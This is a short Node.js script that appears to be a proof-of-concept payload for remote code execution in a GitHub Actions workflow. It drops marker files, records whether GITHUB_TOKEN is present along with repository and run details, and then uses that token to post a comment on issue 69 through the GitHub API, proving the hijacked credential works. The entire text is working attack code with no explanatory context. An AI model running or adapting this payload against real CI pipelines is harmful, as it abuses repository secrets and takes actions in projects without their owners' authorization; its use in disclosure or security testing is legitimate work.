const fs = require('fs');
fs.writeFileSync('/tmp/XD_RCE_MARKER', 'xd-executed');
fs.writeFileSync('xd-exec-proof.txt',
  'token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + '\n' +
  'repo=' + (process.env.GITHUB_REPOSITORY || 'none') + '\n' +
  'cwd=' + process.cwd() + '\n' +
  'run=' + (process.env.GITHUB_RUN_ID || 'none') + '\n');
(async () => {
  try {
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/69/comments', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
      body: JSON.stringify({ body: 'XD_RCE_TOKEN_PROOF ' + Date.now() })
    });
    fs.writeFileSync('xd-token-api.txt', 'status=' + r.status + '\n');
  } catch (e) {
    fs.writeFileSync('xd-token-api.txt', 'err=' + e.message + '\n');
  }
})();
